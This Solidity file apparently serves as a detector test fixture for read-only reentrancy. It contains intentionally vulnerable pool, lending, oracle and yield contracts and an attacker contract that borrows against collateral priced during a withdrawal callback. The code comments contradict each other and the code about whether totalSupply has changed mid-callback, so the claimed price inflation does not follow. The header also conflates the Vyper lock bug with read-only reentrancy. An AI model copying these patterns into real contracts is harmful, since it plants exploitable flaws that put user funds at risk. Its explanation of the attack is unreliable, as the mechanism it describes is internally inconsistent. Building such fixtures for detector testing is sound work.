// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CurveFinance2023Attack
 * @notice Read-Only Reentrancy Vulnerability (Curve Finance Style)
 *
 * VULNERABILITY: Read-only reentrancy attack
 * REAL-WORLD EXPLOIT: Curve Finance, July 30, 2023
 * LOSS: $60M+ across multiple protocols
 *
 * BACKGROUND:
 * Read-only reentrancy occurs when a VIEW function calls an external contract
 * that can manipulate its state during execution, causing inconsistent reads.
 * The Curve Finance attack exploited this in LP token price calculations.
 *
 * ATTACK FLOW:
 * 1. Attacker calls remove_liquidity() on Curve pool
 * 2. During callback (before state update), attacker calls get_virtual_price()
 * 3. get_virtual_price() sees inconsistent state (LP tokens burned but balances not updated)
 * 4. Attacker exploits inflated LP token price to borrow against overvalued collateral
 * 5. Attacker profits from price manipulation
 *
 * AFFECTED PROTOCOLS:
 * - Curve Finance (vyper reentrancy lock bug)
 * - Alchemix
 * - JPEG'd
 * - Metronome
 *
 * TESTED DETECTORS:
 * - readonly-reentrancy
 * - classic-reentrancy (for state-changing functions)
 */

interface ILendingProtocol {
    function borrow(address collateral, uint256 amount) external;
}

/**
 * @title VulnerableCurvePool
 * @notice Simplified Curve pool with read-only reentrancy vulnerability
 */
contract VulnerableCurvePool {
    uint256 public totalSupply;
    uint256 public token0Balance;
    uint256 public token1Balance;

    mapping(address => uint256) public balanceOf;

    event AddLiquidity(address indexed provider, uint256 amount);
    event RemoveLiquidity(address indexed provider, uint256 amount);

    function addLiquidity(uint256 amount0, uint256 amount1) external payable {
        require(msg.value == amount0, "Incorrect ETH amount");

        uint256 shares;
        if (totalSupply == 0) {
            shares = amount0 + amount1;
        } else {
            shares = (amount0 * totalSupply) / token0Balance;
        }

        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        token0Balance += amount0;
        token1Balance += amount1;

        emit AddLiquidity(msg.sender, shares);
    }

    /**
     * @notice VULNERABILITY 1: External call before state update
     * @dev Classic reentrancy that enables read-only reentrancy
     */
    function removeLiquidity(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");

        uint256 amount0 = (shares * token0Balance) / totalSupply;
        uint256 amount1 = (shares * token1Balance) / totalSupply;

        // VULNERABLE: External call BEFORE state update
        // During this call, get_virtual_price() will see inconsistent state
        (bool success, ) = msg.sender.call{value: amount0}("");
        require(success, "Transfer failed");

        // State update happens AFTER external call
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        token0Balance -= amount0;
        token1Balance -= amount1;

        emit RemoveLiquidity(msg.sender, shares);
    }

    /**
     * @notice VULNERABILITY 2: View function vulnerable to read-only reentrancy
     * @dev This function can be called during removeLiquidity callback
     */
    function get_virtual_price() external view returns (uint256) {
        if (totalSupply == 0) return 0;

        // VULNERABLE: Calculation uses current balances
        // During removeLiquidity callback:
        // - totalSupply still includes burned LP tokens
        // - token0Balance/token1Balance not yet decreased
        // Result: Inflated virtual price
        uint256 value = token0Balance + token1Balance;
        return (value * 1e18) / totalSupply;
    }

    /**
     * @notice VULNERABILITY 3: Another view function with external state dependency
     */
    function getCollateralValue(address user) external view returns (uint256) {
        uint256 shares = balanceOf[user];
        uint256 price = this.get_virtual_price();

        // VULNERABLE: Uses potentially manipulated price
        return (shares * price) / 1e18;
    }

    receive() external payable {}
}

/**
 * @title VulnerableLendingProtocol
 * @notice Lending protocol that uses Curve LP tokens as collateral
 */
contract VulnerableLendingProtocol {
    VulnerableCurvePool public curvePool;
    mapping(address => uint256) public borrowed;

    constructor(address _curvePool) {
        curvePool = VulnerableCurvePool(_curvePool);
    }

    /**
     * @notice VULNERABILITY 4: Borrow using LP token collateral (read-only reentrancy risk)
     * @dev Calls view function that can be manipulated via reentrancy
     */
    function borrow(uint256 amount) external {
        // VULNERABLE: Calls view function that may return manipulated value
        // during Curve's removeLiquidity callback
        uint256 collateralValue = curvePool.getCollateralValue(msg.sender);

        require(collateralValue >= amount * 2, "Insufficient collateral");

        borrowed[msg.sender] += amount;
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {}
}

/**
 * @title ReadOnlyReentrancyAttacker
 * @notice Exploits read-only reentrancy in Curve-style pool
 */
contract ReadOnlyReentrancyAttacker {
    VulnerableCurvePool public curvePool;
    VulnerableLendingProtocol public lendingProtocol;

    bool public attacking;

    constructor(address _curvePool, address _lendingProtocol) {
        curvePool = VulnerableCurvePool(_curvePool);
        lendingProtocol = VulnerableLendingProtocol(_lendingProtocol);
    }

    /**
     * @notice Execute read-only reentrancy attack
     */
    function attack() external payable {
        // Step 1: Add liquidity to Curve pool
        curvePool.addLiquidity{value: msg.value}(msg.value, msg.value);

        // Step 2: Remove liquidity (triggers callback)
        uint256 shares = curvePool.balanceOf(address(this));
        attacking = true;
        curvePool.removeLiquidity(shares);
        attacking = false;
    }

    /**
     * @notice Callback exploits read-only reentrancy
     */
    receive() external payable {
        if (attacking) {
            // ATTACK: During Curve's removeLiquidity callback
            // 1. LP tokens are burned from totalSupply
            // 2. But token balances not yet decreased
            // 3. get_virtual_price() returns INFLATED price

            uint256 manipulatedPrice = curvePool.get_virtual_price();
            // Price is inflated because:
            // - totalSupply decreased (denominator smaller)
            // - token balances not yet decreased (numerator same)

            // Exploit: Borrow against overvalued collateral
            try lendingProtocol.borrow(msg.value * 2) {
                // Successfully borrowed with manipulated collateral value
            } catch {
                // Borrow might fail if lending protocol has protections
            }
        }
    }
}

/**
 * @title PriceOracleReentrancy
 * @notice Price oracle vulnerable to read-only reentrancy
 */
contract PriceOracleReentrancy {
    VulnerableCurvePool public pool;

    constructor(address _pool) {
        pool = VulnerableCurvePool(_pool);
    }

    /**
     * @notice VULNERABILITY 5: Oracle reads from vulnerable view function
     * @dev Returns manipulated prices during reentrancy
     */
    function getPrice() external view returns (uint256) {
        // VULNERABLE: Calls view function that can return manipulated value
        return pool.get_virtual_price();
    }

    /**
     * @notice VULNERABILITY 6: Liquidation check using vulnerable oracle
     */
    function canLiquidate(address user, uint256 debt) external view returns (bool) {
        uint256 collateralValue = pool.getCollateralValue(user);

        // VULNERABLE: Uses potentially manipulated collateral value
        // Attacker can avoid liquidation by inflating collateral during view call
        return debt > collateralValue;
    }
}

/**
 * @title YieldAggregatorReentrancy
 * @notice Yield aggregator vulnerable to read-only reentrancy
 */
contract YieldAggregatorReentrancy {
    VulnerableCurvePool public curvePool;
    mapping(address => uint256) public deposits;

    constructor(address _curvePool) {
        curvePool = VulnerableCurvePool(_curvePool);
    }

    /**
     * @notice VULNERABILITY 7: Withdraw calculation uses vulnerable view function
     */
    function withdraw(uint256 shares) external {
        require(deposits[msg.sender] >= shares, "Insufficient balance");

        // VULNERABLE: Calculates withdrawal amount using potentially manipulated price
        uint256 price = curvePool.get_virtual_price();
        uint256 amount = (shares * price) / 1e18;

        deposits[msg.sender] -= shares;
        payable(msg.sender).transfer(amount);
    }

    /**
     * @notice VULNERABILITY 8: Share valuation during deposit
     */
    function deposit() external payable {
        // VULNERABLE: Share calculation uses view function
        // Attacker can manipulate to get favorable share price
        uint256 price = curvePool.get_virtual_price();
        uint256 shares = (msg.value * 1e18) / price;

        deposits[msg.sender] += shares;
    }

    receive() external payable {}
}
